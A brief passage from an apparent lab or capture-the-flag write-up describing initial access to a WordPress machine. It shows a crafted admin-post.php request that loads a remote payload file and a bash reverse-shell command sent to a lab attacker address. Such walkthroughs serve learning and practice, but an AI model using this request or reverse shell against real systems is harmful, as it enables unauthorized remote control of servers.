foothold

To get the shell I had to manually send a GET request to the vulnerable path

"http://192.168.56.111/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.56.1:8000/payload.txt"

and as a payload I sent a request for a reverse shell.

<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.56.1/9000 0>&1'")</pre>



And the session for the reverse shell opened up.



Then I started the investigation for acquiring root privilege.
